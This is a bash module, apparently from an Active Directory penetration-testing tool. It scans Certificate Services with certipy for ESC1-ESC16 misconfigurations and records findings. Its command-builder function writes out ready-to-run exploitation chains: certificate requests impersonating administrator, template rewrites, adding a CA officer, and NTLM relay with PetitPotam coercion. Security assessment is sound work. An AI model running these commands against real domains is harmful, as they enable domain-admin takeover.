#!/bin/bash
################################################################################
# MODULE: Active Directory Certificate Services (ADCS)
# Coverage: ESC1-ESC16, Certificate template vulnerabilities
#
# Findings are driven by certipy's structured JSON (real CA + template names and
# an ESC-appropriate command), not a one-size-fits-all placeholder. Falls back
# to a text scan if the JSON is unavailable so a vulnerability is never dropped.
################################################################################

# Human-readable description for an ESC id.
_adcs_esc_desc() {
    case "$1" in
        ESC1)  echo "Misconfigured Certificate Templates (SAN abuse)" ;;
        ESC2)  echo "Any Purpose EKU" ;;
        ESC3)  echo "Enrollment Agent Templates" ;;
        ESC4)  echo "Vulnerable Template Access Control" ;;
        ESC5)  echo "Vulnerable PKI Object Access Control" ;;
        ESC6)  echo "EDITF_ATTRIBUTESUBJECTALTNAME2" ;;
        ESC7)  echo "Vulnerable CA Access Control" ;;
        ESC8)  echo "NTLM Relay to AD CS HTTP Endpoints" ;;
        ESC9)  echo "No Security Extension (szOID_NTDS_CA_SECURITY_EXT)" ;;
        ESC10) echo "Weak Certificate Mappings" ;;
        ESC11) echo "Relay to ICPR/RPC" ;;
        ESC12) echo "Shell access to ADCS CA via YubiHSM" ;;
        ESC13) echo "Issuance Policy linked to privileged group" ;;
        ESC14) echo "Weak explicit altSecurityIdentities mapping" ;;
        ESC15) echo "EKUwu (application policies, CVE-2024-49019)" ;;
        ESC16) echo "Security Extension disabled on CA" ;;
        *)     echo "Certificate Services Vulnerability" ;;
    esac
}

# Ready-to-run (single line) exploitation command for an ESC, with the REAL CA
# and template substituted. Bits that genuinely cannot be derived from the scan
# (a relay target host, a target SID) are left as obvious <...> placeholders.
_adcs_esc_command() {
    local esc="$1" ca="$2" tmpl="$3"
    [ -z "$ca" ]   && ca="<CA>"
    [ -z "$tmpl" ] && tmpl="<TEMPLATE>"
    local nb="${DOMAIN%%.*}"
    local req="certipy req -u $USERNAME@$DOMAIN -p PASSWORD -dc-ip $DC_IP -ca '$ca' -template '$tmpl'"
    # printf '%s\n' (not echo): echo interprets backslash escapes under xpg_echo
    # / sh-mode, which would mangle the '\administrator' in the ESC3 command.
    case "$esc" in
        ESC1|ESC9|ESC10|ESC16)
            printf '%s\n' "$req -upn administrator@$DOMAIN && certipy auth -pfx administrator.pfx -dc-ip $DC_IP" ;;
        ESC2)
            printf '%s\n' "$req && certipy auth -pfx <pfx> -dc-ip $DC_IP   (Any Purpose EKU -> client auth)" ;;
        ESC3)
            printf '%s\n' "$req && certipy req -u $USERNAME@$DOMAIN -p PASSWORD -dc-ip $DC_IP -ca '$ca' -template User -on-behalf-of '$nb\\administrator' -pfx agent.pfx" ;;
        ESC4)
            printf '%s\n' "certipy template -u $USERNAME@$DOMAIN -p PASSWORD -dc-ip $DC_IP -template '$tmpl' -write && $req -upn administrator@$DOMAIN" ;;
        ESC6)
            printf '%s\n' "$req -upn administrator@$DOMAIN   (EDITF_ATTRIBUTESUBJECTALTNAME2 on CA '$ca')" ;;
        ESC7)
            printf '%s\n' "certipy ca -u $USERNAME@$DOMAIN -p PASSWORD -dc-ip $DC_IP -ca '$ca' -add-officer $USERNAME" ;;
        ESC8)
            printf '%s\n' "certipy relay -target 'http://<CA-WEB-ENROLL-HOST>' -template DomainController   (CA '$ca'; then coerce a DC, e.g. PetitPotam, to the relay)" ;;
        ESC11)
            printf '%s\n' "certipy relay -target 'rpc://<CA-HOST>' -template DomainController   (CA '$ca')" ;;
        ESC13)
            printf '%s\n' "$req && certipy auth -pfx <pfx> -dc-ip $DC_IP   (issuance policy grants a privileged group)" ;;
        ESC15)
            printf '%s\n' "$req -application-policies '1.3.6.1.5.5.7.3.2'   (EKUwu / CVE-2024-49019)" ;;
        *)
            printf '%s\n' "$req -upn administrator@$DOMAIN" ;;
    esac
}

run_adcs_enum() {
    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║  PHASE 3: ADCS Vulnerabilities (ESC1-ESC16)                          ║${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Check if Certipy is available
    local CERTIPY_CMD=""
    if command -v certipy &>/dev/null; then
        CERTIPY_CMD="certipy"
    elif command -v certipy-ad &>/dev/null; then
        CERTIPY_CMD="certipy-ad"
    else
        log_warning "Certipy not installed - skipping ADCS checks"
        log_info "Install: pip3 install certipy-ad"
        return
    fi

    # Require username/password for Certipy
    if [ "$AUTH_TYPE" != "userpass" ]; then
        log_warning "ADCS scanning requires username/password - skipping"
        return
    fi

    log_action "Scanning for ADCS vulnerabilities..."
    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))

    cd adcs || { log_error "Cannot enter adcs dir"; return 1; }

    # Run Certipy find with vulnerability detection (human-readable text).
    $CERTIPY_CMD find -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
        -vulnerable -stdout 2>&1 | tee certipy_output.txt

    local certipy_exit_code=${PIPESTATUS[0]}

    if [ $certipy_exit_code -eq 0 ]; then
        log_success "ADCS scan complete"
        SUCCESSFUL_CHECKS=$((SUCCESSFUL_CHECKS + 1))

        # Structured JSON (clean - stderr to /dev/null, not into the file) so we
        # can pull the real CA/template names. certipy also drops a native
        # <timestamp>_Certipy.json; prefer that, fall back to ours.
        $CERTIPY_CMD find -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
            -vulnerable -json -stdout > certipy_detailed.json 2>/dev/null

        local cj=""
        cj=$(ls -t ./*_Certipy.json 2>/dev/null | head -1)
        [ -z "$cj" ] && [ -s certipy_detailed.json ] && cj="certipy_detailed.json"

        local emitted=0
        if [ -n "$cj" ] && command -v jq >/dev/null 2>&1; then
            # Template-scoped ESCs: one finding per (ESC, template) with its CA.
            while IFS=$'\t' read -r esc tmpl ca; do
                [ -z "$esc" ] && continue
                add_finding "CRITICAL" "ADCS - $esc" \
                    "$(_adcs_esc_desc "$esc") on template '$tmpl' (issuing CA: ${ca:-unknown})" \
                    "$(_adcs_esc_command "$esc" "$ca" "$tmpl")"
                emitted=$((emitted + 1))
            done < <(jq -r '
                (."Certificate Templates"? // {})
                | (if type=="object" then [.[]] else . end) | .[]?
                | select(."[!] Vulnerabilities"?) | . as $t
                | ($t."[!] Vulnerabilities" | keys[]) as $e
                | "\($e)\t\($t."Template Name")\t\(($t."Certificate Authorities" | if type=="array" then (.[0]//"") else (.//"") end))"
            ' "$cj" 2>/dev/null)

            # CA-scoped ESCs (relay / CA ACL): one finding per (ESC, CA).
            while IFS=$'\t' read -r esc ca; do
                [ -z "$esc" ] && continue
                add_finding "CRITICAL" "ADCS - $esc" \
                    "$(_adcs_esc_desc "$esc") on CA '$ca'" \
                    "$(_adcs_esc_command "$esc" "$ca" "")"
                emitted=$((emitted + 1))
            done < <(jq -r '
                (."Certificate Authorities"? // {})
                | (if type=="object" then [.[]] else . end) | .[]?
                | select(."[!] Vulnerabilities"?) | . as $c
                | ($c."[!] Vulnerabilities" | keys[]) as $e
                | "\($e)\t\($c."CA Name")"
            ' "$cj" 2>/dev/null)
        fi

        # Fallback: JSON missing / no jq / parse miss -> text scan with generic
        # commands, so a detected vulnerability is never silently dropped.
        if [ "$emitted" -eq 0 ]; then
            local esc
            for esc in ESC{1..16}; do
                if grep -qiE "\b${esc}\b" certipy_output.txt; then
                    add_finding "CRITICAL" "ADCS - $esc" \
                        "$(_adcs_esc_desc "$esc") detected (see adcs/certipy_output.txt for the CA/template)" \
                        "$(_adcs_esc_command "$esc" "" "")"
                fi
            done
        fi

    else
        # Check if it's an SSL error
        if grep -q "ssl wrapping error\|Connection reset" certipy_output.txt; then
            log_warning "ADCS SSL connection failed - may not have Certificate Services installed"
            log_info "If ADCS exists, try: certipy find ... -scheme http (or check firewall)"
        else
            log_error "ADCS scan failed"
        fi
        FAILED_CHECKS=$((FAILED_CHECKS + 1))
    fi

    # Also enumerate certificate templates via LDAP
    run_ldap "(objectClass=pKICertificateTemplate)" \
        "../ldap/adcs_templates.ldif" "Enumerating certificate templates"

    cd .. || { log_error "Cannot return from adcs dir"; return 1; }
    echo ""
}
